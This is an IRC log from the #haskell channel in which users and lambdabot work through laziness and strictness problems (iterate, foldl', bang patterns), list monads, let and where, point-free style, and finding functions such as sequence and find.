03:50:41 <Baughn> > 225 * 2:+3
03:50:42 <lambdabot>  450.0 :+ 3.0
03:50:47 <roconnor> > 225 *2%3
03:50:47 <lambdabot>  150%1
03:50:59 <Baughn> Ah. :+ is complex?
03:51:37 <Mr_Awesome> so, any suggestions? should i just try to write my own strict version of this computation?
03:52:38 <desegnis> > let iterateN f 0 x = x; iterateN f n x | x > 0 = f (iterateN f (n-1) x) in iterateN (+0) (10^7) 0
03:52:39 <lambdabot>   Non-exhaustive patterns in function iterateN
03:52:48 <desegnis> > let iterateN f 0 x = x; iterateN f n x | n > 0 = f (iterateN f (n-1) x) in iterateN (+0) (10^7) 0
03:52:49 <lambdabot>  Exception: stack overflow
03:53:31 <desegnis> hmmm
03:54:34 <Baughn> > foldl' (+0) (replicate 1000000 0)
03:54:34 <lambdabot>      Occurs check: cannot construct the infinite type: a = b -> a
03:54:34 <lambdabot>     Probabl...
03:54:45 <Baughn> > foldl' (+0) 0 (replicate 1000000 0)
03:54:45 <lambdabot>      Occurs check: cannot construct the infinite type: a = b -> a
03:54:45 <lambdabot>     Probabl...
03:54:50 <Baughn> @ty foldl'
03:54:52 <lambdabot> forall a b. (a -> b -> a) -> a -> [b] -> a
03:54:59 <desegnis> The iterateN version works with -O2 at least
03:55:10 <Baughn> > foldl' (+) 0 (replicate 1000000 0)
03:55:11 <lambdabot>  0
03:55:19 <Baughn> > foldl (+) 0 (replicate 1000000 0)
03:55:20 <lambdabot>  0
03:55:29 <Baughn> > foldr (+) 0 (replicate 1000000 0)
03:55:30 <lambdabot>  0
03:55:33 <Baughn> > foldr (+) 0 (replicate 10000000 0)
03:55:34 <lambdabot>  Exception: stack overflow
03:55:38 <Baughn> > foldl (+) 0 (replicate 10000000 0)
03:55:39 <lambdabot>  0
03:55:46 <Baughn> > foldl (+) 0 (replicate 100000000 0)
03:55:49 <lambdabot> Terminated
03:55:56 <Baughn> > foldl' (+) 0 (replicate 100000000 0)
03:56:00 <lambdabot> Terminated
03:56:12 <Baughn> ..lambdabot does compile with optimization, or so I though
03:56:26 <Mr_Awesome> > foldl' (+) 0 (replicate 10000000 0)
03:56:28 <lambdabot>  0
03:57:08 <Mr_Awesome> desegnis: does the regular iterate not work with -O2?
03:57:30 <desegnis> Mr_Awesome, doesn't seem so, but I wonder why
03:58:01 <desegnis> (that is, it does not work)
03:58:10 <Mr_Awesome> indeed
03:58:38 <Mr_Awesome> damn, normally laziness just tends to work to my advantage
03:59:43 <olsner> desegnis: I get a stack overflow from iterateN
03:59:53 <Baughn> @src iterate
03:59:53 <lambdabot> iterate f x =  x : iterate f (f x)
04:01:11 <desegnis> olsner, ah, I annotated the result to be an Int, my fault
04:01:16 <Baughn> > iterate (+0) 0 !! 10 :: Expr
04:01:16 <lambdabot>  0 + 0 + 0 + 0 + 0 + 0 + 0 + 0 + 0 + 0 + 0
04:01:42 <olsner> > let compose f n x = foldl' (flip $ const f) x $ replicate n () in compose (+0) 10000000 0
04:01:44 <lambdabot>  0
04:04:54 <Baughn> @ty foldl'
04:04:55 <lambdabot> forall a b. (a -> b -> a) -> a -> [b] -> a
04:04:57 <Baughn> @src foldl'
04:04:57 <lambdabot> foldl' f a []     = a
04:04:57 <lambdabot> foldl' f a (x:xs) = let a' = f a x in a' `seq` foldl' f a' xs
04:06:15 <Baughn> > let iterate f x = f x `seq` x : iterate f (f x) in iterate (+0) 0 !! 1000000
04:06:16 <lambdabot>  0
04:06:19 * desegnis_ curses his network
04:06:20 <olsner> @pl let compose f n x = foldl' (flip $ const f) x $ replicate n () in compose
04:06:20 <lambdabot> (line 1, column 63):
04:06:20 <lambdabot> unexpected " "
04:06:20 <lambdabot> expecting variable, "(", operator, "$", "$!", "`seq`", ";" or "in"
04:06:28 <Baughn> > iterate (+0) 0 !! 1000000
04:06:29 <olsner> bug in @pl?
04:06:29 <lambdabot>  Exception: stack overflow
04:06:33 <Baughn> Yeap. Got it.
04:06:57 <olsner> > let iterate f x = f x `seq` x : iterate f (f x) in iterate (+0) 0 !! 10000000
04:07:01 <lambdabot>  0
04:07:07 <Baughn> ..I wonder if that extra bit of laziness would ever /help/
04:08:23 <olsner> > let iterate f x = f x `seq` x : iterate f (f x) in take 1 $ iterate (const undefined) 0
04:08:24 <lambdabot>  Undefined
04:08:33 <olsner> >  take 1 $ iterate (const undefined) 0
04:08:34 <lambdabot>  [0]
04:08:43 <Baughn> Ah.
04:10:04 * desegnis_ finally understood why his attempts at a strict variant of iterateN failed :-/
04:18:10 <desegnis_> and I wonder whether iterate' could fit well into Data.List
04:22:09 <Baughn> desegnis_: It should be possible to do it better. My version forces f x to calculate x, which is bizarre on the face of it.
04:22:29 <Baughn> I'm not sure /how/, though.. >_<
04:22:38 <Mr_Awesome> map f $ iterate' g x -- loses the strictness, right?
04:23:02 <twanvl> > let iterate f x = x : (let fx = f x in fx `seq` iterate f fx) in iterate (+0) 0 !! 1000000
04:23:03 <lambdabot>  0
04:23:41 <Baughn>  let iterate f x = x : (let fx = f x in fx `seq` iterate f fx) in iterate (const undefined) 0 !! 0
04:23:46 <Baughn> > let iterate f x = x : (let fx = f x in fx `seq` iterate f fx) in iterate (const undefined) 0 !! 0
04:23:47 <lambdabot>  0
04:23:50 <Baughn> > let iterate f x = x : (let fx = f x in fx `seq` iterate f fx) in iterate (const undefined) 0 !! 1
04:23:50 <lambdabot>  Undefined
04:23:56 * Baughn applauds
04:24:06 <twanvl> It is still less lazy though
04:24:50 <Baughn> Not so I'd notice
04:25:28 <twanvl> > let iterate f x = x : (let fx = f x in fx `seq` iterate f fx) in map (const 'x') $ iterate undefined ()
04:25:29 <lambdabot>  Undefined
04:25:34 <twanvl> > map (const 'x') $ iterate undefined ()
04:25:35 <lambdabot>  "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx...
04:25:55 <Baughn> > iterate undefined () !! 0
04:25:55 <lambdabot>  ()
04:26:07 <Baughn> > let iterate f x = x : (let fx = f x in fx `seq` iterate f fx) in iterate undefined 0 !! 1
04:26:08 <lambdabot>  Undefined
04:26:38 <Baughn> > iterate undefined ()
04:26:39 <lambdabot>  Undefined
04:27:10 <Baughn> Erk. Can't I just settle for "it'll work under normal conditions"?
04:27:36 <twanvl> iterate undefined _ = undefined:undefined:undefined:undefined:...
04:28:01 <twanvl> iterate undefined _ = undefined:undefined
04:28:02 <desegnis_> that's different from iterate' f x = x `seq` x : iterate' f (f x) ?
04:28:29 <Mr_Awesome> iterate undefined x = x:undefined.... i thought
04:28:39 <twanvl> Mr_Awesome: you are right
04:28:41 <desegnis_> ah yeah
04:29:07 <Baughn> > iterate undefined 0
04:29:08 <lambdabot>  Undefined
04:29:23 <Baughn> Yet somehow it all collapses. Probably because lambdabot is using show, not a stream
04:29:36 <Mr_Awesome> > 0:undefined
04:29:37 <lambdabot>  Undefined
04:29:48 <Baughn> Prelude> iterate undefined 0
04:29:48 <Baughn> [0,*** Exception: Prelude.undefined
04:29:56 <desegnis_> so it's the same as iterate' f x = x : it f (f x) where it f x = x `seq` x : it f (f x)
04:30:16 <desegnis_> ?
04:31:30 <desegnis_> ah no
04:31:37 * desegnis_ gets silent
04:39:00 <fourbissime> hi there. I'd like to do the following : a -> [a -> m a] -> m a (applying a sequence of operations). I guess it is a common task ... is there an existing function to do that ? I'm looking at foldl (>>=) or foldM (>>=) but obviously that is not the right thing.
04:40:02 <desegnis_> :type \x -> sequence . map ($x)
04:40:08 <desegnis_> @type \x -> sequence . map ($x)
04:40:09 <lambdabot> forall (m :: * -> *) a a1. (Monad m) => a1 -> [a1 -> m a] -> m [a]
04:40:50 <fourbissime> great
04:41:02 <Heffalump> put a space between $ and x
04:41:13 <Heffalump> or if you ever use Template Haskell you'll get a nasty surprise
04:41:24 <desegnis_> heh, I've been TH-abstinent so far
04:41:40 <fourbissime> I'm not yet to the point of using TH.
04:41:46 <Heffalump> sure, it's just a good backwards compatibility tip
04:41:50 <fourbissime> one of these days, hopefuly
04:42:18 <Mr_Awesome> i still seem to be getting stack overflows, even with the strictified iterate'
04:43:05 <fourbissime> hey but wait ! it returns m [a] right ? is it the list of intermediate computations ?
04:43:21 <desegnis_> fourbissime, that's right
04:43:32 <desegnis_> do you want only the last?
04:43:33 <fourbissime> ok
04:43:35 <fourbissime> yes
04:44:45 <Mr_Awesome> it would seem haskell isnt good for numeric integration
04:45:00 <desegnis_> oh I'd just fmap last then, fourbissime :)
04:45:28 <fourbissime> :)
04:47:24 * RayNbow managed to get a step further in building the Readline module in Windows... *blinks*
04:47:29 <Mr_Awesome> fourbissime: you want to apply all the (a -> m a) operations in the list to the same initial a?
04:48:58 <opqdonut> pretty much the only possibility with that typesig
04:49:13 <opqdonut> gah
04:49:19 <opqdonut> i read the sig of the solution
04:49:24 <desegnis_> ah, he wanted a fold...
04:49:28 <opqdonut> yeah
04:49:31 <Mr_Awesome> indeed
04:49:33 * RayNbow starts hunting for ncurses for Windows...
04:49:45 <Mr_Awesome> something like iterate but with >>= instead of $
04:50:12 <Mr_Awesome> well, no not like iterate at all :)
04:50:12 <fourbissime> damnit I'm stupid. I could translate what I wanted to do to m a -> [a -> m a] -> m a and then I simply have to do foldl (>>=) (return start) myList and it works :)
04:50:25 <opqdonut> :)
04:59:12 <fourbissime> thanks everyone. later !
05:02:39 <Mr_Awesome> does haskell use arbitrary precision floats or something?
05:03:29 <Baughn> Nope
05:03:36 <Baughn> Though it does have arbitrary precision rationals
05:05:02 <Mr_Awesome> would it read 0.1 as a rational instead of a Float or Double?
05:05:09 <Baughn> No, use 1%10
05:05:09 <opqdonut> :t 0.1
05:05:11 <lambdabot> forall t. (Fractional t) => t
05:05:21 <opqdonut> :t 0.1 :: Rational
05:05:22 <lambdabot> Rational
05:05:24 <opqdonut> :)
05:05:25 <Mr_Awesome> i definitely dont want arbitrary precision
05:05:26 <Baughn> :t 1%10
05:05:27 <lambdabot> forall t. (Integral t) => Ratio t
05:05:50 <Mr_Awesome> yet when i use 0.1, i somehow run out of memory
05:05:51 <opqdonut> Rational is Ratio Integer iirc
05:05:59 <Mr_Awesome> not stack space, RAM. :(
05:06:15 <opqdonut> Mr_Awesome: well annotate it
05:06:18 <Baughn> Fractional would default to Double, though..
05:06:25 <opqdonut> (0.1::Float)
05:06:27 <opqdonut> to be sure
05:06:37 <Baughn> :t 0.1::Double
05:06:39 <lambdabot> Double
05:06:47 <Mr_Awesome> ah ok. well when i use 0.1::Float, it just runs out of stack space
05:06:48 <Baughn> Mm. Right - it does have double, so use it.
05:06:49 <opqdonut> (or if you have multiple constants, give the functions appropriate typesigs)
05:07:07 <Baughn> Float tends to be both less precise /and/ slower..
05:07:29 <Mr_Awesome> slower?
05:07:41 <Baughn> Mr_Awesome: CPUs are optimized for handling full-width floating point, eg. double
05:08:11 <Mr_Awesome> hmm. the benchmarks ive seen always have floats faster than doubles
05:08:41 <Baughn> Those benchmarks are probably calculated with enormous amounts of floats, and SSE operations
05:08:56 <Baughn> SSE does do float faster than double, and floats take up less memory bandwidth
05:09:01 <Baughn> Nevertheless, most of the time, double is faster
05:16:41 <Mr_Awesome> it would seem that as soon as i introduce computations with pairs, i no longer get constant space
05:16:58 <opqdonut> hmm?
05:17:11 <Philippa> Mr_Awesome: are you trying this in ghci? You may well get different behaviour with ghc -O
05:17:23 <opqdonut> yeah, ghci does no optimization
05:17:35 <opqdonut> you'd need manual strictness annotations
05:18:57 <Mr_Awesome> opqdonut: does seq count?
05:19:24 <Philippa> seq probably isn't good enough, because what you really want is unboxed tuples
05:19:31 <Philippa> run it through ghc -O, see what you get
05:19:39 <Mr_Awesome> okay
05:20:14 <Saizan> if you've a tuple as an accumulator you need to use seq on the contents
05:23:50 <Mr_Awesome> ghc -O gives the same result
05:24:32 <Lord_Illidan> > (words "hello world how are you")  >>= (\(x) -> x)
05:24:33 <lambdabot>  "helloworldhowareyou"
05:24:37 <Mr_Awesome> Saizan: using seq on the tuple itself isnt good enough?
05:25:09 <Mr_Awesome> hey björn!
05:26:34 <Lord_Illidan> in the above, why does (words "hello world how are you")  >>= (\(x) -> x) return "helloworldhowareyou"
05:26:46 <Lord_Illidan> instead of :
05:26:48 <Saizan> Mr_Awesome: no, it will only force the tuple contructor, so you can still accumulate huge thunks inside it
05:26:54 <desegnis_> Mr_Awesome, seq on a tuple has little effect, except blowing up if the tuple is bottom
05:26:54 <Lord_Illidan> > words "hello world how are you"
05:26:55 <lambdabot>  ["hello","world","how","are","you"]
05:27:34 <Saizan> Lord_Illidan: because >>= also concats
05:27:58 <desegnis_> Lord_Illidan: This is (>>=) of the list monad, which is defined to be the same as concatMap
05:28:00 <Saizan> ?src [] >>=
05:28:01 <lambdabot> Source not found. Sorry.
05:28:06 <Saizan> ?src [] (>>=)
05:28:07 <lambdabot> m >>= k     = foldr ((++) . k) [] m
05:28:27 <yondalf> ?src concatMap
05:28:27 <lambdabot> concatMap f = foldr ((++) . f) []
05:28:31 <trez> > concatMap id $ words "hello world how are you"
05:28:32 <lambdabot>  "helloworldhowareyou"
05:28:32 <Lord_Illidan> ic
05:28:57 <desegnis_> (the same as concatMap, modulo argument order)
05:29:28 <Mr_Awesome> desegnis_: this is turning into quite a nightmare :(
05:29:37 <Lord_Illidan> ok, thanks..damn..I'm in a nightmare myself
05:29:52 <Philippa> Mr_Awesome: can we have a repaste of what you're trying to do (or a reasonable approximation thereof with the same problem)?
05:30:16 <desegnis_> Mr_Awesome, yeah, fighting with strictness vs laziness is the most tedious work in Haskell land
05:30:18 <Lord_Illidan> I am thinking that this problem can be solved so freakin easily in an imperative language
05:30:48 <Saizan> Lord_Illidan: what do you want to do?
05:30:50 <Mr_Awesome> Philippa: i can post my code as is. its specific, but very short
05:31:19 <Saizan> Mr_Awesome: do so!
05:31:23 <Lord_Illidan> I'd like my code to be a bit more sequential
05:32:06 <Saizan> why?
05:33:05 <Philippa> Lord_Illidan: there're ways to write seemingly sequentially if you must. A succession of declarations in a let-binding with the in... bit just yielding the equivalent of a return statement, for example
05:33:40 <Beelsebob> heh
05:35:04 <Lord_Illidan> > tail [1..5]
05:35:05 <lambdabot>  [2,3,4,5]
05:35:15 <hpaste>  Mr_Awesome pasted "Integration" at http://hpaste.org/6027
05:37:04 <hpaste>  Saizan annotated "Integration" with "tried this?" at http://hpaste.org/6027#a1
05:38:52 <Mr_Awesome> Saizan: that did the trick
05:39:10 <Saizan> Mr_Awesome: do you understand why?
05:39:33 <Saizan> > (undefined,undefined) `seq` ()
05:39:34 <lambdabot>  ()
05:39:43 <Mr_Awesome> Saizan: yeah. do you think that this is probably the most elegant it will get?
05:40:00 <Mr_Awesome> im wondering if there is perhaps a better way to do this
05:40:19 <Mr_Awesome> (the whole "steps" algorithm in general)
05:40:38 <Saizan> uhm syntactically bang patterns are nicer
05:42:04 <Mr_Awesome> bang patterns?
05:42:08 <Philippa> I was about to suggest them too
05:42:16 <Philippa> !x as a pattern is "x, strictly"
05:42:20 <Mr_Awesome> like (!f0, !x0) ?
05:42:23 <Philippa> right
05:42:51 <Mr_Awesome> ah, nice. thanks a lot, everyone. i learned a lot today. :)
05:43:47 <Saizan> i wonder if the optimizer can catch this
05:43:47 <desegnis_> you need {-# LANGUAGE BangPatterns #-} -- (did I get the name of the extension right?)
05:44:32 <Mr_Awesome> oh, i just used -fbang-patterns
05:44:54 <Mr_Awesome> i didnt realize you could specify extensions in the file
05:45:41 <Saizan> it's new from 6.6.1 iirc, but you can also specifye options, with {-# OPTIONS ... #-}
05:46:05 <Saizan> those pragmas must be at the top of the file
05:47:00 <wolverian> I thought LANGUAGE was new in 6.8
05:47:45 <desegnis_> Mr_Awesome, language pragmas are often preferred because they might at some point be standardized. btw GHC has an -X option for every language pragma, so -XBangPatterns is the third possibility
05:47:46 <Igloo> It's not, there are just many more values you can use in 6.8
05:48:28 <Mr_Awesome> desegnis_: i see
06:16:24 <Baughn> Are there any tools that, given a ghc stack, can print what is actually on it?
06:16:34 <Baughn> Eg. in the case of stack overflows
06:16:45 <Baughn> (gdb works, but takes a lot of guesswork)
06:19:25 <Lord_Illidan> I'm sorry I forgot how to do this, but how does one specify multiple vars in a let?
06:19:29 <Lord_Illidan> eg :
06:19:35 <Lord_Illidan> >  let x = 10 in let y = 5 in x+y
06:19:39 <Baughn> Lord_Illidan: Using multiple lines. Or semicolons.
06:19:39 <lambdabot>  15
06:19:44 <Baughn> let x = 10
06:19:48 <Baughn>     y = 15
06:19:53 <Baughn>      in x + y
06:20:02 <Lord_Illidan> the semicolons where what I needed, thanks Baughn
06:20:05 <Baughn> ..got a few extra spaces on the in
06:22:41 <Lord_Illidan> what's the difference between using let and where?
06:24:11 <SamB> hmm. I like this... try looking up cabbage in the Devil's Dictionary some time ;-)
06:24:22 <SamB> Lord_Illidan: let applies to the expression after "in"
06:24:37 <Lord_Illidan> while where applies to the entire thing, right?
06:25:03 <SamB> where can apply to several different guarded right-hand-sides
06:25:18 <SamB> (including the guards)
06:25:46 <Lord_Illidan> yes, thanks SamB
06:25:56 <Lord_Illidan> and heh, thanks for the Devil's Dictionary hint
06:30:40 <Lord_Illidan> I'm getting a very wierd bug here
06:32:48 <hpaste>  Lord Illidan pasted "justification" at http://hpaste.org/6028
06:39:04 <desegnis_> Lord_Illidan, that's not justification, that's re-wrapping :)
06:40:07 <desegnis> But why, for n <= width, is the second field always xs?
06:40:13 <Lord_Illidan> I know, wierd isn't it
06:40:48 <desegnis> why, that's not your code?
06:41:19 <Lord_Illidan> no, it's my code
06:41:30 <Lord_Illidan> I was talking about the re-wrapping part
06:41:36 <Lord_Illidan> regarding the n <= width,
06:42:29 <Lord_Illidan> the second part is xs because it is the remainder of the string
06:42:51 <Lord_Illidan> getLineInt seems to work normally
06:43:27 <desegnis> at least it gives results that are different from what I thought you'd want it to do
06:43:59 <Lord_Illidan> the LeftJustified, yes
06:44:40 <desegnis> *Main> getLineInt ["one two three", "four five six"] 30
06:44:53 <desegnis> ("one two three four five six",["four five six"])
06:45:07 <Lord_Illidan> does it? omg
06:45:23 <desegnis> well you have xs = ["four five six"]
06:45:34 <Lord_Illidan> damn, I thought it was working
06:45:35 <desegnis> that's why I asked about it
06:46:00 <Lord_Illidan> yeah, I see. I didn't test it enough
06:47:01 <Lord_Illidan> 10x for pointing it out desegnis
06:47:37 <desegnis> you'll probably want to pattern-match on the recursive call of getLineInt, and use *both* fields of the result. otherwise you're throwing things away
06:47:55 <Lord_Illidan> desegnis, yes, I know
06:48:03 <desegnis> ok
06:57:36 <jpcooper> is there any way to write func2 f g l = filter f (map g l) in point-free style?
06:57:45 <jpcooper> func2 f = (filter f) . map doesn't seem to work
06:57:47 <Baughn> @pl func2 d g l = filter f (map g l)
06:57:47 <lambdabot> func2 = const ((filter f .) . map)
06:58:13 <Baughn> @pl func2 f g l = filter f (map g l) -- oops
06:58:13 <lambdabot> func2 = (. map) . (.) . filter
07:00:57 <desegnis> (filter f .) . map  is only slightly more tolerable
07:01:13 <desegnis> \f g -> filter f . map g  looks best
07:01:31 <jpcooper> thank you
07:01:51 <Baughn> I'd probably reduce that to \f -> filter f . map
07:02:07 <jpcooper> doesn't work
07:02:32 <Baughn> @ty \f g -> filter f . map g
07:02:34 <lambdabot> forall a b. (b -> Bool) -> (a -> b) -> [a] -> [b]
07:02:34 <desegnis> ... because that'd make you filter a function
07:03:06 <Baughn> @ty \f -> filter f . map
07:03:08 <lambdabot>     Couldn't match expected type `[a]'
07:03:08 <lambdabot>            against inferred type `[a1] -> [b]'
07:03:08 <lambdabot>     Probable cause: `map' is applied to too few arguments
07:03:48 <desegnis> Baugn, you cannot eta-reduce like that
07:03:57 <Baughn> @ty \f -> (filter f) . map
07:03:59 <lambdabot>     Couldn't match expected type `[a]'
07:03:59 <lambdabot>            against inferred type `[a1] -> [b]'
07:03:59 <lambdabot>     Probable cause: `map' is applied to too few arguments
07:04:01 <desegnis> s/Baugn/Baughn
07:04:04 <Baughn> desegnis: This is becoming obvious.
07:04:27 <Baughn> As for /why/, though..
07:04:52 * Baughn adds haskell-wiki-search to firefox's shortcuts
07:05:26 <desegnis> You may only eta-reduce something if it is the (last) argument of both what you're defining, and of the expression you're looking at
07:05:48 <Heffalump> and it doesn't occur free in the remaining expression
07:05:53 <desegnis> But in ’filter f . map g’, the last argument is ‘map g’
07:06:09 <Baughn> Ah. Of course.
07:06:15 <Baughn> @ty (.)
07:06:16 <lambdabot> forall a b (f :: * -> *). (Functor f) => (a -> b) -> f a -> f b
07:06:23 <Baughn> I'd need.. .2, or something
07:06:43 <desegnis> Real-time inline corrections and additions are the nice thing about #haskell :)
07:07:13 <hpaste>  Lord Illidan annotated "justification" with "justification" at http://hpaste.org/6028#a1
07:07:15 <hpaste>  Lord Illidan annotated "justification" with "justification" at http://hpaste.org/6028#a2
07:07:24 <Lord_Illidan> desegnis, I corrected it
07:10:00 <Lord_Illidan> It works now, phew
07:10:15 <Lord_Illidan> thanks for the heads up, I was going mad
07:11:35 <desegnis> Lord_Illidan, nice, but I'm still wondering why you're not simply pattern-matching on getLineInt xs (width-n-1)
07:11:43 <roconnor> @seen dons
07:11:43 <lambdabot> dons is in #haskell-soc, #xmonad and #haskell. I don't know when dons last spoke.
07:11:51 <roconnor> @time dons
07:11:52 <lambdabot> Local time for dons is Sat Mar  1 07:11:52 2008
07:12:26 <Lord_Illidan> desegnis, I don't know what you mean by that
07:13:05 <desegnis> where (z,zs) = getLineInt xs (width-n-1)
07:13:36 <Lord_Illidan> I am using getLineInt xs (width - n -1) to determine the [String] at the end of the tuple, if that's what you mean
07:13:41 <desegnis> then you can use zs in the (n <= width) branch
07:14:11 <desegnis> currently, you're throwing zs away
07:14:15 <Lord_Illidan> Oh
07:14:18 <Lord_Illidan> I see
07:15:00 <Lord_Illidan> makes sense
07:16:33 <Lord_Illidan> but it's still not too clear
07:18:26 <Lord_Illidan> I understand what you mean by throwing zs away
07:18:36 <desegnis> well you said that the second field of the pair is the rest of the input, that part of the input which isn't present in the first field
07:18:39 <Lord_Illidan> since I'm only using the first argument of the tuple
07:18:44 <desegnis> right
07:19:48 <desegnis> in the (n <= width) branch, you're calculating the second field using the length of y
07:20:00 <RayNbow> hmm... d:\App\Program\ghc\ghc-6.8.2\readline-1.0.1\ghc-6.8.2/HSreadline-1.0.1.o: unknown symbol `__imp__rl_message' : unable to load package `readline-1.0.1'
07:20:39 <Baughn> > let f .2 g = (f,g) in (.2) -- What's wrong here?
07:20:39 <lambdabot>  Parse error in pattern at "in" (column 20)
07:20:40 <Lord_Illidan> desegnis, ok, I've done some of it
07:21:08 <desegnis> but you have (in theory, at least) already calculated the second field within the recursive call to getLineInt
07:21:21 <hpaste>  Lord Illidan annotated "justification" with "correction of getLineInt" at http://hpaste.org/6028#a3
07:21:27 <Baughn> Wait, I can't use numbers in infix identifiers? Or?
07:21:31 <Lord_Illidan> desegnis, http://hpaste.org/6028#a3
07:27:52 <desegnis> Lord_Illidan, hang on a moment
07:30:29 <hpaste>  desegnis annotated "justification" with "What I meant" at http://hpaste.org/6028#a4
07:34:20 <desegnis> Note that I had to change the otherwise clause, too
07:36:07 <Lord_Illidan> desegnis, holy crap
07:36:32 <Lord_Illidan> I think I need some more practice, thanks!
07:38:04 <Lord_Illidan> but where do you specify the second term of the tuple?
07:38:35 <desegnis> Ultimately, in the otherwise clause, which is kind of the base case for the recursion
07:38:49 <Lord_Illidan> yeah
07:39:45 <desegnis> Note that if a word doesn't fit on a line, it will remain in the "rest string"
07:40:25 <viklund> I want to chain functions that return Maybies, if I do it like this: f >>= g >>= h
07:40:38 <viklund> and g or f returns Nothing, everything fails
07:41:10 <viklund> I want the behavior that if g failed, and f succeded, h should get the result of f
07:41:44 <Heffalump> write a combinator with type (a -> Maybe a) -> a -> a and then use (.) to combine them
07:41:56 <opqdonut> viklund: use mplus
07:41:59 <Lord_Illidan> desegnis, Yes, it's very recursive
07:42:13 <viklund> I looked at MonadPlus, but that one always keeps the first result
07:42:50 <opqdonut> hmm how about mappend on Maybe
07:42:53 <Heffalump> you could use \x -> f x `mplus` return x
07:42:54 <opqdonut> > mappend Nothing (Just 1)
07:42:55 <lambdabot>  Add a type signature
07:43:02 <viklund> mappend?
07:43:03 <opqdonut> > mappend Nothing (Just 1) :: Maybe Int
07:43:04 <lambdabot>   add an instance declaration for (Monoid Int)
07:43:04 <lambdabot>     In the expression: mappend...
07:43:26 <opqdonut> viklund: the maybe monoid
07:43:46 <opqdonut> but not really applicable here ...
07:43:56 <desegnis> viklund: Heffalump's idea makes this really easy
07:44:01 <viklund> ;), I look at it anyway (always fun)
07:44:02 <viklund> ok
07:44:44 * Heffalump doesn't think the Maybe monad is too appropriate here
07:45:00 <Heffalump> but it's personal taste really
07:45:10 <viklund> so what would you use?
07:45:40 <opqdonut> a new monad with the appropriate semantics :)
07:45:40 <Lord_Illidan> desegnis, I got it now, thanks to a dry run
07:45:53 <opqdonut> (does that actually fit into the monad laws?)
07:46:44 <Lord_Illidan> desegnis, what's the key to writing good haskell? - A good understanding of recursion?
07:47:25 <Heffalump> I don't think it really is a monad at all.
07:47:51 <Heffalump> Lord_Illidan: A good sense for finding abstraction and how to map that into Haskell constructs, IMO.
07:49:57 <Saizan> ?type \f g h -> f >>= (\x -> g x `mplus` return x) >>= h
07:49:58 <lambdabot> forall (m :: * -> *) a b. (MonadPlus m) => m a -> (a -> m a) -> (a -> m b) -> m b
07:50:21 <Saizan> ?type \g -> (\x -> g x `mplus` return x)
07:50:22 <lambdabot> forall (m :: * -> *) a. (MonadPlus m) => (a -> m a) -> a -> m a
07:51:17 <Saizan> what's a good name for that?:)
07:51:44 * RayNbow has finally found something that might help getting readline support in GHC/Win32
07:51:50 <desegnis> Lord_Illidan, nice. and yes, you need a good understanding of recursion if you want to write recursive functions ;) (which you can hardly avoid in Haskell, people just try to write functions in a non-recursive fashion, but in terms of recursive functions, because that makes it clearer)
07:55:21 <gnuvince_> @src flip
07:55:21 <lambdabot> flip f x y = f y x
07:56:04 <Lord_Illidan> of course, this runs me into a 2nd problem, where leftJustified will infinitely loop if width is too small or there's a word which is larger than the width
07:57:08 <Lord_Illidan> but, I will solve that myself, I've got a good idea how to do it now, thanks for your help
08:02:37 <Lord_Illidan> ok did it finally
08:03:06 <hpaste>  Lord Illidan annotated "justification" with "Final version?" at http://hpaste.org/6028#a5
08:06:07 <ToRA|home> hey
08:06:55 <Saizan> is it safe to cabal install cabal?
08:07:18 <ToRA|home> does anyone know if there's a structure / typeclass that supports operations of the type (Monad m) => x (m a) -> m (x a)
08:08:13 <ToRA|home> (where x is the thing that I don't know what it's name is)
08:08:38 <desegnis> Lord_Illidan, mylength = Data.List.genericLength, btw
08:09:10 <Heffalump> ToRA|home: Foldable, perhaps? (I'm guessing)
08:09:26 <Saizan> or Traversable
08:10:17 <Baughn> I'm not sure what that is supposed to do, but Functor?
08:10:26 <Heffalump> no, Functor doesn't do it
08:10:47 <idnar> @type fmap
08:10:49 <lambdabot> forall a b (f :: * -> *). (Functor f) => (a -> b) -> f a -> f b
08:10:50 <ToRA|home> yeah, foldable / traversable may have mileage
08:11:05 <idnar> @type curry
08:11:06 <lambdabot> forall a b c. ((a, b) -> c) -> a -> b -> c
08:11:08 <desegnis> Functor doesn't give you a way to extract something out of it
08:11:11 <idnar> @type uncurry
08:11:13 <lambdabot> forall a b c. (a -> b -> c) -> (a, b) -> c
08:11:19 <idnar> @type uncurry2
08:11:20 <idnar> @type uncurry3
08:11:20 <lambdabot> Not in scope: `uncurry2'
08:11:22 <lambdabot> Not in scope: `uncurry3'
08:11:27 <idnar> are there multi-arg versions of those anywhere?
08:11:49 <Baughn> desegnis: No, but I don't see him taking anything out of the monad, just putting in
08:12:22 <Saizan> ?type Data.Traversable.sequence
08:12:24 <lambdabot> forall (t :: * -> *) (m :: * -> *) a. (Monad m, Data.Traversable.Traversable t) => t (m a) -> m (t a)
08:12:37 <Baughn> m a -> m b, where b could be x a
08:12:37 <desegnis> Baughn, out of the Functor x, not out of the Monad m
08:12:40 <ToRA|home> Saizan: win :)
08:13:01 <idnar> Baughn: I assume  x (m a) is some kind of container that contains multiple values of type m a
08:13:32 <Baughn> Oh, right. fmap can put the x in m, but not extract the m from x first..
08:13:55 <ToRA|home> idnar: for my implementation there's only one
08:14:18 <idnar> hmm
08:14:25 <idnar> yeah, actually, ignore the thing I said, I need more coffee
08:14:30 <ska-fan> I'd never thought that #haskell was as popular as #debian.
08:14:40 <idnar> the problem is extracting from x, not the number of values stored within it
08:14:43 <Baughn> ska-fan: Unlike #debian, #haskell is also helpful
08:15:58 <ToRA|home> if it helps, the actual function i'm tyring to implement is :: Monad m => (a -> m b) -> x a -> m (x b)
08:16:07 <ToRA|home> but the first half is just functor
08:18:01 <ClimDan> Cool Dating Club site ===> new-datingclub eu
08:19:12 <johnnowak> ?type (===>)
08:19:14 <lambdabot> Not in scope: `===>'
08:20:51 <Lord_Illidan> desegnis, thanks
08:22:31 <jpcooper> @hoogle (a -> Bool) -> [a] -> a
08:22:32 <lambdabot> No matches, try a more general search
08:22:51 <jpcooper> @hoogle [a] -> (a -> Bool) -> a
08:22:51 <lambdabot> No matches, try a more general search
08:22:55 <jpcooper> I need a find function
08:23:01 <jpcooper> is there such a thing?
08:23:26 <Baughn> filter?
08:23:35 <smg> jpcooper: you want filter
08:23:38 <Saizan> ?type find
08:23:39 <lambdabot> forall a. (a -> Bool) -> [a] -> Maybe a
08:23:45 <jpcooper> head filter, right
08:24:07 <Baughn> filter if you want multiple results (including 0), but find looks good too..
08:24:24 <jpcooper> find doesn't seem to be in scope on ghci
08:24:45 <idnar> @index find
08:24:45 <lambdabot> Data.List
08:24:55 <idnar> :m + Data.List
